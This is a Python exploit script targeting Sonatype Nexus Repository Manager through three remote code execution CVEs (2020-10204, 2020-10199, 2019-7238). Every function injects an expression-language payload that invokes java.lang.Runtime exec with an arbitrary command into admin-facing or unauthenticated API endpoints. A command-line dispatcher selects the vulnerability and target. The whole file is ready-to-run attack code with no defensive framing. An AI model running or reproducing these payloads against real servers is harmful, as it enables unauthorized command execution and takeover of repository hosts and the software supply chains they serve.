import sys
import json
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def cve_2020_10204(target, command, cookie):
    header = {"X-Requested-With": "XMLHttpRequest", "X-Nexus-UI": "true",
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                            "Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
              "Accept": "*/*", "Content-Type": "application/json", "Origin": target, "Referer": target,
              "Accept-Encoding": "gzip, deflate, br",
              "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6", "Cookie": cookie,
              "NX-ANTI-CSRF-TOKEN": cookie.split(";")[0].split("=")[1]}

    data = {
        "action": "coreui_User",
        "method": "update",
        "data": [
            {
                "userId": "admin",
                "version": "2",
                "firstName": "admin",
                "lastName": "User",
                "email": "admin@example.org",
                "status": "active",
                "roles": ["nxadmin$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('%s')}" % command]
            }
        ],
        "type": "rpc",
        "tid": 11
    }

    url = target + "/service/extdirect"
    print()
    response = requests.post(url, headers=header, data=json.dumps(data), verify=False)
    print(response.status_code)
    print(response.text)


def cve_2020_10199(target, command, cookie):
    header = {"X-Requested-With": "XMLHttpRequest", "X-Nexus-UI": "true",
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                            "Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
              "Accept": "*/*", "Content-Type": "application/json", "Origin": target, "Referer": target,
              "Accept-Encoding": "gzip, deflate, br",
              "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6", "Cookie": cookie,
              "NX-ANTI-CSRF-TOKEN": cookie.split(";")[0].split("=")[1]}

    data = {
        "name": "internal",
        "online": "true",
        "storage": {
            "blobStoreName": "default",
            "strictContentTypeValidation": "true"
        },
        "group": {
            "memberNames": [
                "$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('%s')}" % command]
        }
    }
    url = target + "/service/rest/beta/repositories/go/group"
    response = requests.post(url, headers=header, data=json.dumps(data), verify=False)
    print(response.status_code)
    print(response.text)


def cve_2019_7238(target, command, cookie=None):
    header = {
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Accept": "*/*",
        "Content-Type": "application/json",
    }

    data = {
        "action": "coreui_Component",
        "method": "previewAssets",
        "data": [
            {
                "page": 1,
                "start": 0,
                "limit": 50,
                "sort": [{"property": "name", "direction": "ASC"}],
                "filter": [
                    {"property": "repositoryName", "value": "*"},
                    {
                        "property": "expression",
                        "value": "233.class.forName('java.lang.Runtime').getRuntime().exec('%s')" % command
                    },
                    {"property": "type", "value": "jexl"}
                ]
            }
        ],
        "type": "rpc",
        "tid": 8
    }
    url = target + "/service/extdirect"
    response = requests.post(url, headers=header, data=json.dumps(data), verify=False)
    print(response.status_code)
    print(response.text)


if __name__ == '__main__':
    vuln = sys.argv[1]
    target = sys.argv[2]
    command = sys.argv[3]
    cookie = None
    try:
        cookie = sys.argv[4]
    except:
        cookie = ""
    if str(vuln) not in ["10204", "10199", "7238"]:
        print("漏洞选择错误")
        sys.exit(0)
    func = {"10204": cve_2020_10204, "10199": cve_2020_10199, "7238": cve_2019_7238}
    function = func[vuln]
    function(target, command, cookie)

